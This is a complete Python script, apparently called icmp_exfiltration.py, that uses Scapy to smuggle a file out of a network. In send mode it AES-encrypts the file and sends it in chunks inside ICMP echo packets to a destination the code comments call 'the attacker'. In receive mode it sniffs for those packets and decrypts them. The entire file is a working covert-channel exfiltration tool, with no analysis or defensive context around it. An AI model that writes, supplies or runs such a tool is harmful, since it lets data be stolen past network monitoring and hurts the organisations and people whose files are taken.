from scapy.all import *
from sys import argv
from Crypto.Cipher import AES
from Crypto.Util import Counter
import os


def check_usage():
    print("Usage:")
    print("Send mode: python3 icmp_exfiltration.py send <hex_key> <file_path> <dest_ip>")
    print("Receive mode: python3 icmp_exfiltration.py receive <hex_key> <output_file>")
    exit(1)


def init_cipher(hex_key, nonce):
    key = bytes.fromhex(hex_key)
    ctr = Counter.new(64, prefix=nonce)
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
    return cipher


def main():
    # Check if the script is run with the correct number of arguments
    # and the correct mode (send or receive)
    if len(argv) < 2 or argv[1] not in ["send", "receive"]:
        check_usage()

    mode = argv[1]
    if mode == "send" and len(argv) != 5:
        check_usage()
    if mode == "receive" and len(argv) != 4:
        check_usage()

    print(f"Mode: {mode}")

    if mode == "send":
        hex_key = argv[2]
        file_path = argv[3]
        dest_ip = argv[4]
        iface = "eth0"

        # Read and encrypt the file
        with open(file_path, "rb") as f:
            data = f.read()

        nonce = os.urandom(8)  # 64-bit nonce
        cipher = init_cipher(hex_key, nonce)
        encrypted = cipher.encrypt(data)

        print(f"[*] File read and encrypted. Sending to {dest_ip}...")

        # Send the nonce to the attacker
        pkt_nonce = IP(dst=dest_ip) / ICMP(type=8, code=42) / Raw(load=nonce)
        send(pkt_nonce, iface=iface, verbose=False)

        # Send encrypted data in chunks (max ~1400 bytes per packet)
        chunk_size = 1400
        for i in range(0, len(encrypted), chunk_size):
            chunk = encrypted[i:i+chunk_size]
            pkt = IP(dst=dest_ip) / ICMP(type=8, code=42) / Raw(load=chunk)
            send(pkt, iface=iface, verbose=False)

        print(f"[+] Done sending {len(encrypted)} bytes.")

    elif mode == "receive":
        hex_key = argv[2]
        output_file = argv[3]
        iface = "eth0"

        print("[*] Listening for ICMP packets...")

        collected = []
        nonce = None

        def handle_packet(pkt):
            nonlocal nonce, collected
            if ICMP in pkt and pkt[ICMP].type == 8 and pkt[ICMP].code == 42 and Raw in pkt:
                payload = bytes(pkt[Raw].load)
                if nonce is None:
                    nonce = payload
                    print("[+] Nonce received.")
                else:
                    collected.append(payload)

        # Sniff until we get all packets (Ctrl+C or timeout stops)
        sniff(iface=iface, prn=handle_packet, timeout=5)

        if nonce is None:
            print("[!] No nonce received. Aborting.")
            sys.exit(1)

        # Combine all encrypted chunks
        encrypted_data = b''.join(collected)

        # Decrypt
        cipher = init_cipher(hex_key, nonce)
        decrypted = cipher.decrypt(encrypted_data)

        # Write to file
        with open(output_file, "wb") as f:
            f.write(decrypted)

        print(f"[+] File received and saved to {output_file}")


if __name__ == "__main__":
    main()
